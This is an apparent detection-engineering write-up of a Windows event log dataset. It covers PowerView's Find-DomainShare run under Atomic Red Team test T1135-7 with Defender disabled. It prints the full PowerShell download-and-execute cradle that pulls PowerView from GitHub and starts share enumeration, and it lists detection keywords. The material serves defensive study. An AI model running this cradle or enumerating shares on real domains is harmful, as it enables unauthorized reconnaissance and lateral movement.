# T1135-7: Network Share Discovery — Share Discovery with PowerView

## Technique Context

Network Share Discovery (T1135) involves adversaries enumerating accessible shares across a domain network to map data repositories, identify lateral movement paths, and locate sensitive files. PowerView, part of the PowerSploit offensive security framework, provides the `Find-DomainShare` function for this purpose. PowerView does not simply list shares using SMB broadcast queries; it first enumerates domain computers via LDAP against the domain controller, then iterates over each host testing for accessible shares. This behavioral pattern — an LDAP domain enumeration query followed by many SMB connection attempts — is the core detection opportunity. When Defender is enabled, it blocks PowerView at the PowerShell script level because PowerSploit's signatures are well-known to antivirus engines.

## What This Dataset Contains

With Windows Defender disabled, this dataset captures PowerView's `Find-DomainShare` execution from a domain-joined Windows 11 workstation (ACME-WS06.acme.local).

**Process execution chain:** The defended variant showed PowerShell executing with command: `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose`. In the undefended run, this command executed successfully. Security EID 4688 records only two `whoami.exe` child processes (both as creator process `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`), confirming the test framework ran; the whoami calls are the ART test framework's pre- and post-execution identity checks.

**PowerShell test framework completion:** 106 PowerShell events are present (104 EID 4104, 2 EID 4103). The EID 4103 events include `Set-ExecutionPolicy Bypass -Scope Process -Force` and a Write-Host "DONE" completion marker, confirming the test framework ran to completion — a meaningful contrast with the defended run (41 PowerShell events, no completion marker) where Defender halted execution with STATUS_ACCESS_DENIED (exit code `0xC0000022`).

**Sysmon EID 1 process creates:** Two `whoami.exe` executions are captured (PIDs 17412 and 17216) both with `ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` running as SYSTEM. These represent the pre/post execution identity checks embedded in the ART test framework.

**DLL loading:** Nine Sysmon EID 7 image load events record .NET CLR initialization in the PowerShell process (`mscoree.dll`, `mscoreei.dll`, `clr.dll`, `mscorlib.ni.dll`, `clrjit.dll`), plus PowerShell's `System.Management.Automation.ni.dll`, `urlmon.dll`, and Windows Defender DLLs (`MpOAV.dll`, `MpClient.dll`).

**Named pipe:** Sysmon EID 17 creates the PowerShell host pipe `\PSHost.134182398541972...17160.DefaultAppDomain.powershell`.

**File access:** Sysmon EID 11 records powershell.exe accessing the PowerShell startup profile data file, a standard initialization artifact.

**Process access events:** Sysmon EID 10 records PowerShell accessing both `whoami.exe` processes with `GrantedAccess: 0x1FFFFF`.

The undefended dataset has considerably fewer events (15 Sysmon, 2 Security, 106 PowerShell) than the defended run (25 Sysmon, 9 Security, 41 PowerShell) — yet it confirms successful execution, while the defended run produced more events precisely because Defender's block actions generated additional telemetry.

## What This Dataset Does Not Contain

**PowerView script block content:** The 104 EID 4104 events in the PowerShell channel are represented by only 20 samples in this context file. The critical PowerView script body — including the `Find-DomainShare` function definition and LDAP enumeration code — executed and was logged, but is not surfaced in the samples here. In the full dataset on disk, those script block events contain the PowerView source.

**LDAP queries to the domain controller:** PowerView's `Find-DomainShare` begins by querying Active Directory for domain computer objects. No Sysmon EID 3 (network connection) events to port 389 (LDAP) or 636 (LDAPS) against the domain controller (192.168.4.10) appear in the samples. The Sysmon-modular configuration may not capture LDAP connections made by PowerShell.

**SMB share enumeration network traffic:** The core network behavior of PowerView — connection attempts to port 445 on domain hosts — does not appear in the Sysmon samples. No EID 3 or EID 22 events from PowerView's enumeration are present.

**Domain enumeration results:** No events reveal which shares were discovered or whether `Find-DomainShare -CheckShareAccess` found any accessible shares on the ACME domain hosts.

## Assessment

This dataset confirms that with Defender disabled, PowerView runs to completion on this domain workstation. The reliable detection telemetry here is the PowerShell EID 4104 script block logging, which captures PowerView's distinctive function signatures (`Find-DomainShare`, the PowerSploit module header). Because PowerView is loaded via `IEX (IWR ...)` (download cradle), no file artifact appears on disk; detection depends entirely on PowerShell logging being enabled.

For defenders, this dataset illustrates why PowerShell script block logging is the critical control point for catching PowerView-family tools. Process creation events alone are insufficient — only `whoami.exe` child processes appear in Security EID 4688. Without script block logging, this execution leaves almost no workstation-level forensic trace beyond the PowerShell process itself.

Compared to the defended variant (which produced a clean block event with exit code `0xC0000022`), this dataset represents a more operationally realistic scenario where the tool executes silently from a defender's perspective unless script block logging is reviewed.

## Detection Opportunities Present in This Data

- **PowerShell EID 4104:** The full PowerSploit/PowerView script content is present in the complete dataset's 104 script block events; keywords like `Find-DomainShare`, `Invoke-ShareFinder`, `Get-NetShare`, and the PowerSploit module metadata are detectable in those logs
- **PowerShell EID 4104:** The download cradle `(New-Object Net.WebClient).DownloadString` or `IWR` fetching from `raw.githubusercontent.com/PowerShellMafia/PowerSploit` is itself a high-fidelity indicator, present in the script block log
- **Security EID 4688 / Sysmon EID 1:** PowerShell running as SYSTEM spawning `whoami.exe` is anomalous on a user workstation
- **PowerShell EID 4103:** `Set-ExecutionPolicy Bypass -Scope Process` from a PowerShell process running as SYSTEM is a reliable secondary indicator of automated adversary tooling
